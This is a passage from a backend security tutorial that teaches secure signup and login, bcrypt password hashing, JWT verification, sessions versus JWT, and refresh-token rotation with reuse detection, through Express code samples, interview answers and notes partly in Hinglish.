- Cost factor too low (4-8) or so high that a handful of logins freeze the server.
- Comparing hashes with `===` (use `bcrypt.compare`).
- Logging passwords (including in request body logs), or echoing them in error messages.
- Letting users set unlimited password length (a DoS vector for slow hashes; also the 72-byte truncation).

**Revision notes**

- Slow + salted + adaptive hash: bcrypt (cost 12) or Argon2id.
- Salt and cost live inside the hash string.
- 72-byte limit: validate max length.
- Native bcrypt uses the libuv thread pool; combine with rate limiting.
- Never SHA-256/MD5; never encrypt; never log passwords.

### 3.2 Signup and login APIs `[ESSENTIAL]`

**Concept**

Signup: validate input -> normalize email -> hash password -> insert user -> respond with safe user data (never the hash). Login: find user by email -> compare password -> issue tokens -> respond. Authentication = "who are you?" (proving identity). Day 4 covers authorization (what you may do).

**Why it matters**

These two endpoints are the front door of your system. Interviewers check for subtle things: error message wording, user enumeration, timing, mass assignment, duplicate emails, rate limiting.

**Internal working: security details worth knowing**

1. **Validation at the boundary.** Check type, format and length of every input (zod here). This also blocks NoSQL-style operator injection (Day 2).
2. **Normalize emails** (trim, lowercase) before storing and before lookup so `Asha@x.com` and `asha@x.com` are one account. (Our MySQL collation is case-insensitive, but never rely on that alone.)
3. **Unique constraint** on `email` is the real duplicate guard; catch `ER_DUP_ENTRY` rather than doing check-then-insert.
4. **Mass assignment**: never copy the whole request body into the insert. A client sending `{ "role": "admin" }` must not become an admin. We take only `email` and `password`, and `role` always defaults to `user` in the database.
5. **Generic login errors**: "Invalid email or password" for both unknown email and wrong password. Specific messages let attackers enumerate which emails are registered.
6. **Timing attack**: if unknown emails return instantly but known emails take 250 ms (bcrypt), response time reveals which accounts exist. Fix by always running a bcrypt compare, using a dummy hash when the user does not exist.
7. **Do not return `password_hash`** or put it in logs or tokens.
8. **Rate limit** login and signup (Day 5) and consider account lockout or CAPTCHA after repeated failures.
9. **Signup enumeration trade-off**: returning `409 Email already registered` reveals that an email exists. Many products accept this for usability; high-security products respond identically ("check your email") and send the real message by email. Mention the trade-off in interviews.

**Code example**

```js
// src/routes/auth.js (Day 3 version: issues only an access token; Day 4 adds refresh tokens)
import { Router } from 'express';
import { z } from 'zod';
import { pool } from '../db/mysql.js';
import { AppError } from '../errors.js';
import { hashPassword, verifyPassword, DUMMY_HASH } from '../services/password.js';
import { signAccessToken } from '../services/tokens.js';

export const authRouter = Router();

const emailField = z.string().trim().toLowerCase().email().max(254);

const signupSchema = z
  .object({
    email: emailField,
    password: z.string().min(10, 'Password must be at least 10 characters').max(72),
  })
  .strict(); // unknown keys (for example "role") cause a validation error

const loginSchema = z
  .object({
    email: emailField,
    password: z.string().min(1).max(72),
  })
  .strict();

authRouter.post('/signup', async (req, res) => {
  const { email, password } = signupSchema.parse(req.body);
  const passwordHash = await hashPassword(password);

  try {
    const [result] = await pool.execute(
      'INSERT INTO users (email, password_hash) VALUES (?, ?)',
      [email, passwordHash],
    );
    res.status(201).json({ id: result.insertId, email, role: 'user' });
  } catch (err) {
    if (err.code === 'ER_DUP_ENTRY') {
      throw new AppError(409, 'Email already registered', 'EMAIL_EXISTS');
    }
    throw err;
  }
});

authRouter.post('/login', async (req, res) => {
  const { email, password } = loginSchema.parse(req.body);

  const [rows] = await pool.execute(
    'SELECT id, email, role, password_hash FROM users WHERE email = ?',
    [email],
  );
  const user = rows[0];

  // Always run exactly one bcrypt comparison, even for unknown emails (timing equalization)
  const ok = await verifyPassword(password, user?.password_hash ?? DUMMY_HASH);
  if (!user || !ok) {
    throw new AppError(401, 'Invalid email or password', 'INVALID_CREDENTIALS');
  }

  const accessToken = signAccessToken(user);
  res.json({
    accessToken,
    user: { id: user.id, email: user.email, role: user.role },
  });
});
```

The ZodError thrown by `.parse()` needs mapping to a 400 response; Day 6's final error handler does that (`err.name === 'ZodError'`). In zod v4 `z.string().email()` still works but is deprecated in favour of `z.email()`; both are fine for this lab.

**Frontend connection**

Tumhare login form ka `onSubmit` -> `fetch('/auth/login', { method: 'POST', body })` -> response mein token. Frontend validation (required, min length) sirf UX ke liye hai; server validation hi security hai, kyunki koi bhi `curl` se direct request bhej sakta hai. Same rule jo Week 3 / Day 3 mein tha: never trust the client.

**Real-world scenario**

Marketplace seller onboarding: attacker script `POST /auth/login` ko 1 million common emails ke saath run karta hai taaki dekhe kaunsi emails registered hain (account enumeration), phir un par credential stuffing karta hai (leaked passwords from other sites). Generic errors + equal timing + rate limiting teeno mil kar is attack ko mehnga banate hain.

**Interview answer:**

"For signup I validate and normalize the input, hash the password with bcrypt, insert only the fields I allow, rely on a unique index for duplicate emails, and never return the hash. For login I look the user up by email, compare the password using bcrypt even when the user does not exist so response time does not reveal valid accounts, and return the same generic error for any failure. I add rate limiting on both endpoints, and I never let the client set privileged fields such as role."

**Follow-up questions**

1. *Why return the same message for unknown email and wrong password?* To prevent user enumeration.
2. *What is credential stuffing and how do you mitigate it?* Attackers replay username/password pairs leaked from other sites. Mitigate with rate limiting, IP and account throttling, breached-password checks, MFA and anomaly detection.
3. *What status code for failed login?* 401 Unauthorized (really "unauthenticated"). 403 is for authenticated users who lack permission.
4. *Where do you validate password strength?* On the server: minimum length (length matters more than complexity rules), maximum length, optionally a breached-password check. Client checks are only UX.
5. *Should the login endpoint be GET?* No. Credentials must never be in a URL (they end up in logs, history and Referer headers). Use POST over HTTPS.

**Common mistakes**

- Returning "User not found" vs "Wrong password".
- Using `SELECT *` and sending the whole row back.
- `User.create(req.body)` (mass assignment).
- Check-then-insert for duplicates without a unique index.
- Putting the password or token in query strings or logs.
- Forgetting HTTPS in production (credentials travel in clear text otherwise).

**Revision notes**

- Validate -> normalize -> hash -> insert (signup); lookup -> compare -> token (login).
- Unique index + catch duplicate error.
- Generic error + dummy-hash compare = no enumeration via message or timing.
- No mass assignment; never return `password_hash`.

### 3.3 JWT structure and verification `[ESSENTIAL]`

**Concept**

JWT (JSON Web Token) ek compact, URL-safe string hai jo claims (user id, role, expiry) carry karta hai aur digitally signed hota hai. Server ko session store mein lookup nahi karna padta: token verify karo (signature check) aur claims trust karo. Format:

```text
<header>.<payload>.<signature>
```

Each part is Base64URL encoded:

- **Header**: `{ "alg": "HS256", "typ": "JWT" }` -- algorithm and token type (and optionally `kid`, key id).
- **Payload** (claims): `{ "sub": "42", "role": "user", "iss": "week5-lab", "aud": "week5-lab-clients", "iat": 1760000000, "exp": 1760000900 }`.
- **Signature**: `HMAC-SHA256(base64url(header) + "." + base64url(payload), secret)` for HS256. For RS256/ES256 it is a signature by a private key, verified with the public key.

Registered claims: `iss` (issuer), `sub` (subject, the user id), `aud` (audience), `exp` (expiry), `nbf` (not before), `iat` (issued at), `jti` (unique id).

**The most important interview point:** a JWT is *signed*, not *encrypted*. Anyone can Base64-decode the payload and read it. The signature only guarantees it was not modified. So never put passwords, card numbers or sensitive personal data in a JWT.

**Why it matters**

JWT questions come up in almost every backend interview: structure, HS256 vs RS256, expiry, storage, revocation, and attacks. Strong candidates explain what verification actually checks.

**Internal working**

Verification steps (what `jwt.verify` does for you):

1. Split into three parts; decode header and payload.
2. Check that the header `alg` is in *your* allow-list (never trust the header's choice).
3. Recompute the signature with your secret/public key and compare it in constant time.
4. Check `exp` (and `nbf`) against the current time (with small allowed clock tolerance if configured).
5. Check `iss` and `aud` against expected values when you pass them.
6. Only then trust the claims.

HS256 vs RS256:

| | HS256 (HMAC, shared secret) | RS256 / ES256 (asymmetric) |
|---|---|---|
| Keys | One shared secret signs and verifies | Private key signs; public key verifies |
| Who can create tokens | Anyone who has the secret (every verifier) | Only the holder of the private key |
| Typical use | One monolith or one trusted API | Multiple services, third-party verification, identity providers (publish public keys via JWKS) |
| Speed | Faster | Slower to sign |

**Code example: see the structure with built-ins only (learning script)**

```js
// jwt-anatomy.js -- learning only. In production use a maintained library (jsonwebtoken or jose).
import { createHmac, timingSafeEqual } from 'node:crypto';

const b64url = (input) => Buffer.from(input).toString('base64url');
const fromB64url = (s) => JSON.parse(Buffer.from(s, 'base64url').toString('utf8'));

const secret = 'demo-secret-do-not-use-in-real-life-0123456789';

function signHs256(payload) {
  const header = { alg: 'HS256', typ: 'JWT' };
  const signingInput = `${b64url(JSON.stringify(header))}.${b64url(JSON.stringify(payload))}`;
  const signature = createHmac('sha256', secret).update(signingInput).digest('base64url');
  return `${signingInput}.${signature}`;
}

function verifyHs256(token) {
  const [h, p, s] = token.split('.');
  if (!h || !p || !s) throw new Error('Malformed token');

  const header = fromB64url(h);
  if (header.alg !== 'HS256') throw new Error('Unexpected algorithm'); // pin the algorithm

  const expected = createHmac('sha256', secret).update(`${h}.${p}`).digest();
  const actual = Buffer.from(s, 'base64url');
  if (actual.length !== expected.length || !timingSafeEqual(actual, expected)) {
    throw new Error('Bad signature');
  }

  const payload = fromB64url(p);
  if (typeof payload.exp !== 'number' || payload.exp * 1000 < Date.now()) {
    throw new Error('Token expired');
  }
  return payload;
}

const now = Math.floor(Date.now() / 1000);
const token = signHs256({ sub: '42', role: 'user', iat: now, exp: now + 900 });
console.log(token);
console.log('Payload is readable by anyone:', fromB64url(token.split('.')[1]));
console.log('Verified:', verifyHs256(token));

// Tamper test: change the role in the payload, keep the old signature
const [h, , s] = token.split('.');
const forgedPayload = b64url(JSON.stringify({ sub: '42', role: 'admin', iat: now, exp: now + 900 }));
try {
  verifyHs256(`${h}.${forgedPayload}.${s}`);
} catch (e) {
  console.log('Forgery rejected:', e.message);
}
```

**Code example: production-style tokens with `jsonwebtoken`**

```js
// src/services/tokens.js
import jwt from 'jsonwebtoken';
import { config } from '../config.js';

const ACCESS_TTL = '15m';

export function signAccessToken(user) {
  return jwt.sign(
    { role: user.role },            // keep the payload minimal
    config.jwt.accessSecret,
    {
      algorithm: 'HS256',           // explicit, never rely on defaults
      subject: String(user.id),     // "sub"
      issuer: config.jwt.issuer,    // "iss"
      audience: config.jwt.audience,// "aud"
      expiresIn: ACCESS_TTL,        // "exp"
    },
  );
}

export function verifyAccessToken(token) {
  return jwt.verify(token, config.jwt.accessSecret, {
    algorithms: ['HS256'],          // allow-list: blocks "none" and algorithm confusion
    issuer: config.jwt.issuer,
    audience: config.jwt.audience,
    clockTolerance: 5,              // seconds of allowed clock skew
  });
}
```

`jwt.verify` throws `TokenExpiredError` (expired), `JsonWebTokenError` (bad signature, wrong alg, wrong aud/iss, malformed) or `NotBeforeError`. For the client, all of them map to the same `401`.

**The authenticate middleware**

```js
// src/middleware/authenticate.js
import { verifyAccessToken } from '../services/tokens.js';
import { AppError } from '../errors.js';

export function authenticate(req, res, next) {
  const header = req.get('authorization') ?? '';
  const [scheme, token] = header.split(' ');

  if (scheme !== 'Bearer' || !token) {
    return next(new AppError(401, 'Missing or malformed Authorization header', 'UNAUTHENTICATED'));
  }

  try {
    const claims = verifyAccessToken(token);
    req.user = { id: Number(claims.sub), role: claims.role };
    return next();
  } catch {
    // do not leak whether it was expired, forged or malformed
    return next(new AppError(401, 'Invalid or expired token', 'UNAUTHENTICATED'));
  }
}
```

Usage:

```js
import { authenticate } from './middleware/authenticate.js';

app.get('/me', authenticate, (req, res) => {
  res.json({ id: req.user.id, role: req.user.role });
});
```

**Frontend connection**

Tumne shayad `jwt-decode` use kiya ho taaki token ka payload read karke username dikha sako. Ye bilkul isliye possible hai kyunki payload encrypted nahi hai. Frontend par decode karna UI ke liye theek hai, par kabhi bhi "role === admin" frontend check ko security na samjho: server har request par signature verify karta hai. Token request mein `Authorization: Bearer <token>` header mein jaata hai (axios interceptor ya fetch wrapper).

**Real-world scenario**

API gateway + 3 microservices: auth service RS256 private key se tokens sign karti hai; baaki services sirf public key (JWKS endpoint) se verify karti hain. Kisi service ko token banane ki power nahi milti. Agar HS256 use karte, toh har service ke paas signing secret hota, aur kisi ek service ke compromise hone par attacker koi bhi token forge kar sakta.

**Interview answer:**

"A JWT has three Base64URL parts: a header with the algorithm, a payload with claims such as subject, role, issuer, audience and expiry, and a signature over the first two parts. It is signed, not encrypted, so anyone can read the payload and I never put secrets in it. On each request the server verifies the signature with its key using an explicit algorithm allow-list, checks expiry, issuer and audience, and only then trusts the claims. I use short-lived access tokens, HS256 for a single service and RS256 or ES256 when several services need to verify tokens without being able to create them."

**Follow-up questions**

1. *What is the `alg: none` attack?* Some libraries historically accepted tokens whose header said `"alg": "none"` (no signature). An attacker could forge any payload. Defence: always pass an explicit `algorithms` list to verify; modern libraries also reject `none` by default.
2. *What is algorithm confusion?* A server expecting RS256 uses its *public* key to verify. If it accepts HS256 too, an attacker signs a token with HS256 using the public key (which is public) as the HMAC secret and the server verifies it successfully. Defence: pin `algorithms: ['RS256']`.
3. *Can you revoke a JWT?* Not by itself; it is valid until `exp`. Options: short expiry plus refresh tokens, a deny-list of `jti` values, or a per-user "token version" claim checked against the DB (which re-adds a lookup). Day 4 covers this.
4. *Where should the token be stored on the client?* Trade-offs on Day 4: memory for access tokens, httpOnly cookie for refresh tokens. `localStorage` is readable by any XSS payload.
5. *What if the secret is weak or leaked?* Anyone can forge tokens for any user. Use at least 256 bits of random secret, store it in a secret manager, rotate with a key id (`kid`); Day 6 covers this.
6. *Why include `iss` and `aud`?* Prevent a token minted for another service or environment from being accepted by this one.
7. *What is `exp` unit?* Seconds since the Unix epoch (not milliseconds). A classic bug is comparing `exp` with `Date.now()` without multiplying by 1000.

**Common mistakes**

- Believing JWT payloads are encrypted.
- Not pinning `algorithms` in `verify`.
- Using `jwt.decode()` (no verification) for authorization decisions.
- Long-lived access tokens (days or months) with no revocation path.
- Storing sensitive data in claims; putting large data in claims (every request carries it).
- A short or guessable secret such as `secret` or `password123`.
- Treating the token as proof of *current* permissions: role changes do not take effect until the token expires.

**Revision notes**

- Structure: header.payload.signature (Base64URL); signed, not encrypted.
- Verify = pin algorithm, check signature, `exp`, `iss`, `aud`.
- HS256 shared secret; RS256/ES256 private/public.
- `decode` is not `verify`.
- Revocation needs short TTL + refresh tokens or a deny-list.

### Day 3 wrap-up

**Key concepts to remember**

- bcrypt: slow, salted, adaptive; cost ~12; salt inside hash; 72-byte limit; Argon2id is the modern alternative.
- Signup/login safe patterns: validation, normalized email, unique index, no mass assignment, generic errors, dummy-hash compare.
- JWT = signed claims; payload is readable; verification pins the algorithm and checks `exp`, `iss`, `aud`.
- `jwt.decode` does not verify; `alg: none` and algorithm confusion are stopped by `algorithms: [...]`.

**Five revision questions**

1. Why bcrypt and not SHA-256 for passwords, and where does the salt live?
2. Why does the login endpoint run a bcrypt compare even when the email does not exist?
3. What are the three parts of a JWT and which part is secret?
4. What does `jwt.verify` check and why must you pass `algorithms`?
5. Why is returning "Email not found" on login a vulnerability?

**One practical coding task**

Implement `/auth/signup`, `/auth/login` and `GET /me` in the lab. Write a script that (a) signs up a user, (b) logs in and prints the access token, (c) decodes the payload by hand with `Buffer.from(part, 'base64url')`, (d) changes `role` to `admin` in the payload, re-encodes it and shows that `/me` returns 401. This is `EX-JWT-01`.

**Self-assessment checklist**

- [ ] I can explain hashing vs encryption vs encoding.
- [ ] I can describe how bcrypt stores salt and cost, and why cost matters.
- [ ] I can write signup and login with validation and safe error messages.
- [ ] I can explain what is and is not protected in a JWT.
- [ ] I can explain `alg: none` and algorithm confusion in two sentences each.

---

## Day 4 - Access/refresh tokens, sessions vs JWT, authentication vs authorization, RBAC

**Time plan (about 2 hours):** 20 min sessions vs JWT, 45 min refresh-token rotation (code), 25 min authn vs authz + RBAC, 20 min frontend flow + storage, 10 min revision.

**Learning objectives**

- Explain why a short-lived access token plus a long-lived refresh token is used, and what problem each solves.
- Implement refresh-token rotation with hashed storage, reuse detection and logout, using httpOnly cookies.
- Compare server-side sessions with JWT-based authentication and choose between them for a scenario.
- Distinguish authentication from authorization and implement role-based access control (RBAC) middleware plus ownership checks.
- Recognize IDOR/BOLA (broken object-level authorization), the most common real-world API vulnerability.

### 4.1 Sessions vs JWT `[ESSENTIAL]`

**Concept**

- **Session-based auth**: server login ke baad ek random session id banata hai, data server-side store (memory, Redis, DB) mein rakhta hai, aur browser ko session id cookie mein deta hai. Har request par server session store mein lookup karta hai.
- **JWT-based auth**: server signed token deta hai jisme claims hote hain; server ko har request par store lookup nahi karna padta (stateless verification).

**Why it matters**

"Sessions vs JWT" is a standard question, and the best answer is not "JWT is better". It is about trade-offs: revocation, scaling, client types and complexity.

**Internal working**

```text
Session:  browser --cookie(sid)--> server --lookup sid--> Redis/DB --> user + data
JWT:      client --Bearer token--> server --verify signature + exp--> claims (no lookup)
```

| Aspect | Server-side session | JWT (stateless access token) |
|---|---|---|
| State | Server stores it | Token carries it; server stores nothing (except refresh tokens) |
| Revocation / logout | Immediate: delete the session | Hard: valid until `exp` unless deny-list or short TTL |
| Scaling | Needs a shared store (Redis) when you have many instances | Any instance verifies with the key; easy horizontal scaling |
| Per-request cost | One store lookup | CPU for signature check, no network call |
| Permissions change | Reflected immediately (read from store/DB) | Stale until the token expires |
| Browser clients | Cookie (httpOnly, SameSite) works naturally; needs CSRF protection | Authorization header (no CSRF) or cookie (CSRF again) |
| Mobile / third-party API clients | Awkward | Natural (Bearer header) |
| Token theft impact | Attacker uses the session until it is revoked | Attacker uses the token until it expires |
| Complexity | Simple and mature | Easy to implement badly (storage, rotation, revocation) |

Honest summary: for a server-rendered or first-party browser app a plain session cookie is simpler and safer. JWTs shine for APIs used by mobile apps, multiple services, and third parties. Many production systems use a hybrid: short-lived JWT access token plus a server-tracked refresh token, which gives stateless verification for most requests and revocation power for the refresh step.

**Frontend connection**

React SPA ke liye "JWT in localStorage" tutorials bahut common hain, lekin localStorage ko koi bhi script (XSS) read kar sakti hai. Session/refresh cookie `httpOnly` ho toh JavaScript use read nahi kar sakta. Is liye access token memory mein (React state/module variable) aur refresh token httpOnly cookie mein rakhna ek common balanced approach hai.

**Real-world scenario**

Banking web app: security team demands "log out all devices immediately when a password is changed". With pure stateless JWT access tokens valid for 7 days this is impossible. With 15-minute access tokens and a revocable refresh token table, the worst-case exposure is 15 minutes, and refresh stops immediately.

**Interview answer:**

"A session stores state on the server and gives the client an opaque id in a cookie, so revocation is immediate but every request needs a store lookup. A JWT carries signed claims, so any instance can verify it without a lookup, which scales easily and suits mobile and service-to-service use, but it cannot be revoked before expiry without extra machinery. I choose sessions for simple first-party web apps and a hybrid for APIs: a short-lived access token for stateless checks and a hashed, rotating, revocable refresh token stored in the database."

**Follow-up questions**

1. *Is JWT stateless really?* The access-token check is stateless. Once you add refresh tokens, deny-lists or token versions you reintroduce server state, which is fine and normal.
2. *Which one is more secure?* Neither by itself. Security comes from storage (httpOnly cookies), short lifetimes, HTTPS, CSRF/XSS defences and revocation.
3. *How do you log out with JWT?* Delete tokens on the client, revoke the refresh token on the server, and accept that the existing access token lives until `exp` (hence short TTL). Optionally deny-list its `jti` until expiry.
4. *Where do sessions live in a multi-instance deployment?* A shared store such as Redis (Week 6 / Day 4), not process memory.

**Common mistakes**

- Choosing JWT because it is trendy without needing statelessness.
- 30-day access tokens.
- Using in-memory sessions (default `express-session` MemoryStore) in production: leaks memory and breaks with multiple instances.
- Treating logout as "delete the token on the client" only.

**Revision notes**

- Session = server state + opaque cookie id; JWT = signed claims, stateless verify.
- Revocation is the key difference.
- Hybrid: short access JWT + revocable refresh token.

### 4.2 Access tokens and refresh tokens `[ESSENTIAL]`

**Concept**

- **Access token**: short-lived (5-15 minutes), sent on every API call (`Authorization: Bearer ...`). If stolen, damage window is small.
- **Refresh token**: long-lived (days to weeks), used only to get a new access token at one endpoint (`/auth/refresh`). Kept in an `httpOnly` cookie; stored *hashed* in the database so it can be revoked.

**Why it matters**

Short access tokens limit the blast radius; refresh tokens keep users logged in without re-entering passwords. Rotation plus reuse detection turns a stolen refresh token into a detectable event.

**Internal working: rotation with reuse detection**

1. Login: create a *token family* (a UUID). Issue refresh token R1 (random 32 bytes), store `SHA-256(R1)` with `family_id`, `expires_at`.
2. Refresh: client sends R1. Server hashes it, finds the row, checks it is not expired or revoked, then **revokes R1**, issues R2 in the same family, and returns a new access token plus R2 (in the cookie).
3. If R1 is presented again (already revoked), someone is replaying an old token (the legitimate user or a thief has a stale copy). Server **revokes the whole family**, forcing a fresh login on every device holding that chain.
4. Logout: revoke the family. "Logout everywhere": revoke all families for the user.

Why hash the refresh token in the DB: if the table leaks, the attacker cannot use the stored values as tokens. Because a refresh token is 256 bits of randomness (not a human password), a fast hash such as SHA-256 is enough; slow hashes like bcrypt are for low-entropy passwords. Do not hash access tokens in a DB, they are not stored there at all.

Why opaque random tokens (not JWT) for refresh: they must be revocable via DB state anyway, so a JWT would add nothing but size.

**Code example: the refresh-token service**

```js
// src/services/refreshTokens.js
import { createHash, randomBytes, randomUUID } from 'node:crypto';
import { pool, withTransaction } from '../db/mysql.js';
import { AppError } from '../errors.js';

export const REFRESH_TTL_MS = 7 * 24 * 60 * 60 * 1000; // 7 days

export const sha256Hex = (value) => createHash('sha256').update(value).digest('hex');

// db can be the pool or a transaction connection (both have .execute)
export async function issueRefreshToken(db, userId, familyId = randomUUID()) {
  const token = randomBytes(32).toString('base64url'); // 256 bits, returned to the client ONCE
  const expiresAt = new Date(Date.now() + REFRESH_TTL_MS);

  const [result] = await db.execute(
    `INSERT INTO refresh_tokens (user_id, family_id, token_hash, expires_at)
     VALUES (?, ?, ?, ?)`,
    [userId, familyId, sha256Hex(token), expiresAt],
  );
  return { token, id: result.insertId, familyId, expiresAt };
}

export async function rotateRefreshToken(presentedToken) {
  const hash = sha256Hex(presentedToken);

  const outcome = await withTransaction(async (conn) => {
    // Lock this token row so two simultaneous refreshes of the same token are serialized
    const [rows] = await conn.execute(
      `SELECT id, user_id, family_id, expires_at, revoked_at
       FROM refresh_tokens WHERE token_hash = ? FOR UPDATE`,
      [hash],
    );
    const row = rows[0];
    if (!row) return { status: 'invalid' };

    if (row.revoked_at) {
      // REUSE DETECTED: an old token was replayed. Kill the whole family.
      // We RETURN (not throw) so the transaction commits this revocation.
      await conn.execute(
        `UPDATE refresh_tokens SET revoked_at = UTC_TIMESTAMP()
         WHERE family_id = ? AND revoked_at IS NULL`,
        [row.family_id],
      );
      return { status: 'reuse' };
    }

    if (row.expires_at <= new Date()) return { status: 'expired' };

    const [users] = await conn.execute('SELECT id, email, role FROM users WHERE id = ?', [row.user_id]);
    const user = users[0];
    if (!user) return { status: 'invalid' };

    const next = await issueRefreshToken(conn, user.id, row.family_id);
    await conn.execute(
      'UPDATE refresh_tokens SET revoked_at = UTC_TIMESTAMP(), replaced_by_id = ? WHERE id = ?',
      [next.id, row.id],
    );
    return { status: 'ok', user, refreshToken: next };
  });

  if (outcome.status !== 'ok') {
    throw new AppError(401, 'Invalid refresh token', 'INVALID_REFRESH_TOKEN'); // same message for all failures
  }
  return outcome;
}

export async function revokeFamilyByToken(token) {
  const [rows] = await pool.execute(
    'SELECT family_id FROM refresh_tokens WHERE token_hash = ?',
    [sha256Hex(token)],
  );
  if (!rows[0]) return;
  await pool.execute(
    'UPDATE refresh_tokens SET revoked_at = UTC_TIMESTAMP() WHERE family_id = ? AND revoked_at IS NULL',
    [rows[0].family_id],
  );
}

export async function revokeAllForUser(userId) {
  await pool.execute(
    'UPDATE refresh_tokens SET revoked_at = UTC_TIMESTAMP() WHERE user_id = ? AND revoked_at IS NULL',
    [userId],
  );
}

// Housekeeping (run from a scheduled job, Week 6 / Day 5): remove long-expired rows
export async function deleteOldRefreshTokens() {
  await pool.execute(
    'DELETE FROM refresh_tokens WHERE expires_at < DATE_SUB(UTC_TIMESTAMP(), INTERVAL 30 DAY)',
  );
}
```

A subtle point worth remembering for interviews: in the reuse branch we `return { status: 'reuse' }` instead of throwing. If we threw inside `withTransaction`, the helper would roll back, and the family revocation we just wrote would be undone.

**Code example: auth routes with cookies**

```js
// src/routes/auth.js (additions and replacements for Day 4)
import { config } from '../config.js';
import {
  issueRefreshToken, rotateRefreshToken, revokeFamilyByToken, REFRESH_TTL_MS,
} from '../services/refreshTokens.js';

const REFRESH_COOKIE = 'refresh_token';

function refreshCookieOptions() {
  return {
    httpOnly: true,                              // JavaScript cannot read it (XSS cannot steal it)
    secure: config.env === 'production',         // HTTPS only in production
    sameSite: 'strict',                          // not sent on cross-site requests (CSRF defence)
    path: '/auth',                               // browser sends it only to /auth/* endpoints
    maxAge: REFRESH_TTL_MS,                      // milliseconds in Express
  };
}

// In /login, after the password check succeeds (replaces the Day 3 response):
//   const refresh = await issueRefreshToken(pool, user.id);
//   res.cookie(REFRESH_COOKIE, refresh.token, refreshCookieOptions());
//   res.json({ accessToken: signAccessToken(user), user: { id: user.id, email: user.email, role: user.role } });

authRouter.post('/refresh', async (req, res) => {
  const presented = req.cookies?.[REFRESH_COOKIE];
  if (typeof presented !== 'string' || presented.length === 0) {
    throw new AppError(401, 'Missing refresh token', 'INVALID_REFRESH_TOKEN');
  }

  try {
    const { user, refreshToken } = await rotateRefreshToken(presented);
    res.cookie(REFRESH_COOKIE, refreshToken.token, refreshCookieOptions());
    res.json({
      accessToken: signAccessToken(user),
      user: { id: user.id, email: user.email, role: user.role },
    });
  } catch (err) {
    if (err instanceof AppError && err.status === 401) {
      res.clearCookie(REFRESH_COOKIE, { ...refreshCookieOptions(), maxAge: undefined });
    }
    throw err;
  }
});

authRouter.post('/logout', async (req, res) => {
  const presented = req.cookies?.[REFRESH_COOKIE];
  if (typeof presented === 'string') await revokeFamilyByToken(presented);
  res.clearCookie(REFRESH_COOKIE, { ...refreshCookieOptions(), maxAge: undefined });
  res.status(204).end();
});
```

Wire up `cookie-parser` once in `app.js`: `app.use(cookieParser());`. Express 5 note: `res.clearCookie` ignores `maxAge`/`expires` options, and the `path`, `httpOnly`, `secure`, `sameSite` values must match the ones used when the cookie was set or the browser will not remove it.

Cookie attribute cheat sheet:

| Attribute | Purpose |
|---|---|
| `HttpOnly` | JavaScript (`document.cookie`) cannot read it; limits XSS damage |
| `Secure` | Sent only over HTTPS |
| `SameSite=Strict` | Never sent on cross-site requests; strongest CSRF mitigation, but a link from another site arrives without the cookie |
| `SameSite=Lax` | Sent on top-level GET navigations from other sites, not on cross-site POST/iframe/fetch; browser default for cookies with no attribute in modern Chrome |
| `SameSite=None; Secure` | Sent on cross-site requests (needed when frontend and API are on different registrable domains); then you need explicit CSRF protection (Day 5) |
| `Path=/auth` | Limits where the browser attaches the cookie |
| `Max-Age` / `Expires` | Lifetime; omit for a session cookie |

"Site" means registrable domain: `app.example.com` and `api.example.com` are *same-site* (so `Strict` works); `example.com` and `example.io` are cross-site.

**Frontend connection (what your React app does)**

```js
// api.js (browser code)
let accessToken = null;      // kept in memory, not in localStorage
let refreshPromise = null;   // single-flight: many 401s trigger only one refresh call

async function refreshAccessToken() {
  refreshPromise ??= fetch('/auth/refresh', { method: 'POST', credentials: 'include' })
    .then(async (res) => {
      if (!res.ok) throw new Error('Session expired');
      const data = await res.json();
      accessToken = data.accessToken;
      return accessToken;
    })
    .finally(() => { refreshPromise = null; });
  return refreshPromise;
}

export async function api(path, options = {}, retry = true) {
  const res = await fetch(path, {
    ...options,
    headers: { ...options.headers, Authorization: `Bearer ${accessToken}` },
  });
  if (res.status === 401 && retry) {
    await refreshAccessToken();          // throws if refresh fails -> redirect to login
    return api(path, options, false);    // retry once with the new access token
  }
  return res;
}
```

On a full page reload the in-memory access token is gone; call `/auth/refresh` on app start to get a new one (the httpOnly cookie is still there). This is the same "bootstrap auth state" pattern you use with React context.

**Real-world scenario**

Employee opens the marketplace admin panel on a shared laptop and forgets to log out. Next day, the 15-minute access token has long expired; the refresh cookie (7 days) would still work, so the product also offers "log out of all devices" (`revokeAllForUser`) and shows "last active" sessions based on `refresh_tokens` rows. If a thief copies the refresh cookie and uses it while the real user also refreshes, one of them replays a revoked token, the family is revoked and both are forced to log in again, which is exactly the detection we want.

**Interview answer:**

"I issue a 15-minute JWT access token and a long-lived opaque refresh token. The refresh token is 32 random bytes, stored only as a SHA-256 hash in the database with a family id, expiry and revocation fields, and sent to the browser in an httpOnly, Secure, SameSite cookie scoped to the auth path. On refresh I rotate: revoke the presented token and issue a new one in the same family inside a transaction. If a revoked token is presented again I treat it as theft and revoke the whole family. Logout revokes the family, and the access token simply expires within minutes."

**Follow-up questions**

1. *Why store a hash of the refresh token?* A database leak must not hand the attacker working tokens. A fast hash is sufficient because the token has 256 bits of entropy.
2. *Why rotate at all?* A stolen refresh token without rotation is valid for its entire lifetime. Rotation makes tokens single-use, and reuse becomes detectable.
3. *What about the race when the client sends two refreshes at once (two tabs)?* The second request carries an already-rotated token and looks like reuse, logging the user out. Mitigations: single-flight refresh in the client (shown above), and server-side a short grace window (for example 10-30 seconds) where the immediately previous token is still accepted and returns the same successor [ADVANCED].
4. *Why `SameSite=Strict` and `Path=/auth`?* The cookie is only needed by auth endpoints; restricting path and site reduces exposure and CSRF risk.
5. *Where do you keep the access token on the client?* In memory. It is short-lived; losing it on reload is fine because refresh restores it. `localStorage` exposes it to any XSS.
6. *Should the refresh token be a JWT?* It can be, but an opaque random value looked up in the DB is simpler and fully revocable.
7. *What if the frontend and API are on different sites?* Use `SameSite=None; Secure` plus CORS with `credentials: true` for exact origins, and add CSRF protection on the refresh endpoint (Origin check or CSRF token). See Day 5.

**Common mistakes**

- Storing refresh tokens in plain text in the DB.
- Not rotating, or rotating without reuse detection.
- Throwing inside the transaction in the reuse branch, which rolls back the revocation.
- Returning the refresh token in the JSON body and letting the SPA store it in `localStorage`.
- Same secret for access and refresh JWTs (when refresh is a JWT) or equal lifetimes.
- No cleanup job, so the token table grows forever.
- Forgetting to clear the cookie with matching attributes on logout.

**Revision notes**

- Access: JWT, 15 min, memory, Bearer header. Refresh: opaque random, 7 days, httpOnly cookie, hashed in DB.
- Rotate on every use; reuse of a revoked token revokes the family.
- Cookie flags: HttpOnly, Secure, SameSite, Path.
- Frontend: single-flight refresh, refresh on app start.

